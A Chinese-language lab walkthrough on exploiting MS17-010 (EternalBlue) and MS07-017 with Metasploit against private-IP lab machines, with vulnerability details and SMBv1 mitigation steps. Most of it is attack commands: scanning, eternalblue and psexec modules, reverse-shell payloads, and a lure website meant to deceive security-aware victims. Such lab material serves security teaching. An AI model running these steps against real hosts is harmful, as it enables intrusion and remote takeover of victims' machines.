***MS17-010***

  

**01**

NEWS

**漏洞简介**

漏洞名称：“永恒之蓝”漏洞

漏洞编号：MS17-010，CVE-2017-0143/0144/0145/0146/0147/0148

漏洞类型：缓冲区溢出漏洞

漏洞影响：信息泄露

CVSS评分：9.3（High）

利用难度：Medium

基础权限：不需要

**02**

NEWS

**漏洞影响**

Windows Vista SP2;

Windows Server 2008 SP2 and R2 SP1; 

Windows 7 SP1; 

Windows 8.1; 

Windows Server 2012 Gold and R2; 

Windows RT 8.1; 

Windows 10 Gold, 1511, and 1607;

Windows Server 2016

以上系统打开445号端口都容易受到影响。

**03**

NEWS

**组件概述**

    SMB(Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。其目的是将DOS操作系统中的本地文件接口“中断13”改造为网络文件系统。

    SMB1.0协议由于在文件共享传输过程中存在的传输效率低以及传输空间小等缺陷被人们所摒弃。为了更好的实现网络中文件的共享过程，在SMB1.0的基础上开发了新的网络文件传输协议，并将其命名为SMB2.0。

    该协议在实现了文件共享传输的基本功能的基础上对文件传输的效率、文件缓存的空间以及文件并发传输等问题进行改进，使得在局域网或更高配置的网络环境下，文件传输过程的速度和效率等得到了很大的提升。

**04**

NEWS

**解决方案**

禁用 SMBv1

对于客户端操作系统：

1、打开“控制面板”，单击“程序”，然后单击“打开或关闭 Windows 功能”。

2、在 Windows 功能窗口中，清除SMB1.0/CIFS 文件共享支持复选框，然后单击确定关闭窗口。

3、重新启动系统。

  

对于服务器操作系统：

1、打开服务器管理器，然后单击管理菜单并选择删除角色和功能。

2、在功能窗口中，清除SMB1.0/CIFS 文件共享支持复选框，然后单击确定关闭窗口。

3、重新启动系统。

**05**

NEWS

**漏洞复现**

攻击机：kali

靶机：windows 7 sp1

  

1、扫描目标机存在的漏洞

nmap --script=vuln 192.168.1.105

扫描结果如下：

  

![](../Images/ce44e0c98357b3a0af3a3067ce92f07f.png)

    扫描结果中存在445端口打开，并且出现了smb-vuln-ms17-010（Eternal blue永恒之蓝）漏洞。

  

  

2、检测漏洞是否存在

打开msf 搜索ms\_17\_010

msfconsole

search ms17\_010

![](../Images/ad969691a1c6bd5c2b22bdf0f79ab9ac.png)

 选择auxiliary/scanner/smb/smb\_ms17\_010模块来检测

use auxiliary/scanner/smb/smb\_ms17\_010 

执行show options 查看信息并配置目标主机

  

show options

set rhosts 192.168.1.105

![](../Images/f4a27ecd5ed54ac0b267394235b9c65e.png)

使用exploit进行扫描，证实目标存在ms17\_010

![](../Images/33c6605b526f58c4427d13f29e762c1c.png)

back返回msf控制台

  

  

3、利用漏洞模块1

使用永恒之蓝攻击模块：

use exploit/windows/smb/ms17\_010\_eternalblue

查看设置

show options

设置目标主机

set rhosts 192.168.1.105

执行攻击

exploit

成功获取到shell

  

![](../Images/2c5450c110e9b6fea600bac5480f58be.png)

  

  

4、利用漏洞模块2

    MS17-010 的psexec是针对Microsoft Windows的两款最受欢迎的漏洞进行攻击。

    它是基于SMB协议的，适用于已经知道目标系统账号密码并开放SMB端口的情况下进行攻击。

  

**利用条件**

为了能够使用 exploit/windows/smb/ms17\_010\_psexec 必须满足下面条件：

使用任意有效的用户名和密码

1.防火墙必须允许SMB流量出入

2.目标必须使用SMBv1协议

3.目标必须缺少MS17-010补丁

4.目标必须允许匿名IPC $和管道名

**利用条件**

进入模块

use exploit/windows/smb/ms17\_010\_psexec 

查看设置

show options

参数介绍

NAMED\_PIPES可选

默认情况下，模块将扫描任何可用管道的公共管道列表，您可用按名次指定一个管道名

  

LEAKATTEMPTS 可选

被用来确保漏洞的稳定性

  

DBGTRACE可选

用于调试，提供非常详细的信息

  

SMBUser可选

一个有效的windows用户名

  

SMBPass可选

一个有效的windows密码

设置必要参数

set rhosts 192.168.1.105

set smbuser ldwj

set smbpass ldwj 

执行

exploit

![](../Images/4ffa6f68a23f1b40c9d31cc61ef625e3.png)

可使用getuid查看获取的权限

  

![](../Images/dc48130df324212818ee13870e2274f8.png)

注：如果需要反弹shell可以使用payload

set payload windows/shell/reverse\_tcp

  

  

***MS07-017***

  

**01**

NEWS

**实验环境**

受害者：Windows XP SP2 professional

IP：192.168.1.105

攻击者：kali

**02**

NEWS

**漏洞利用**

  

进入msf中的漏洞利用模块

msfconsole

serach ms07\_017

use exploit/windows/browser/ms07\_017\_ani\_loadimage\_chunksize

    在防火墙开启的时候用Active的方式进行攻击不会成功，采用Passive方式，构造一个链接，诱使被害者连接，利用浏览器的漏洞。

    我们要伪造一个网站，诱使受害者访问。SRVHOST可以指定为本机的IP地址，我们也可以打开SSL和设置SSL的证书，迷惑有安全意识的用户。

    URIPATH是访问的URL地址，可以手动指定，比如：192.168.1.104:/service，这里我们默认设置为根目录即可。

    然后输入exploit执行，等待用户访问即可。

show options

set srvhost 192.168.1.104

set payload windows/shell/reverse\_tcp

exploit

用户打开浏览器访问后，即可成功上线。
